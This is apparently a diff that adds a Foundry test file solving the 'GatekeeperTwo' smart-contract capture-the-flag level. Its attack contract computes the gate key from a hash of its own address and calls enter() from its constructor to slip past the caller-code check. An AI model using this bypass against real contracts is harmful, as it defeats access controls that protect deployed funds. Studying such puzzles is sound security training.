@@ -1,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Test} from "forge-std/Test.sol";
+import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";
+
+contract GatekeeperTwoTest is Test {
+        GatekeeperTwo public gatekeeperTwo;
+        address public attacker = address(0x1234);
+
+        function setUp() public {
+                gatekeeperTwo = new GatekeeperTwo();
+        }
+
+        function testGatekeeperTwoAttack() public {
+                //set the msg.sender and tx.origin to the attacker address
+                vm.startPrank(attacker, attacker);
+
+                // Create an instance of the attack contract
+                new GatekeeperTwoAttack(address(gatekeeperTwo));
+
+                // Check if the attack was successful
+                assertEq(gatekeeperTwo.entrant(), attacker, "attacker should be the entrant");
+        }
+}
+
+contract GatekeeperTwoAttack{
+        constructor(address _gatekeeperTwo) {     
+                uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^ type(uint64).max;
+                IGatekeeperTwo(_gatekeeperTwo).enter(bytes8(key));
+        }
+}
+
+interface IGatekeeperTwo{
+        function enter(bytes8 _gatekey) external returns (bool);
+}
+
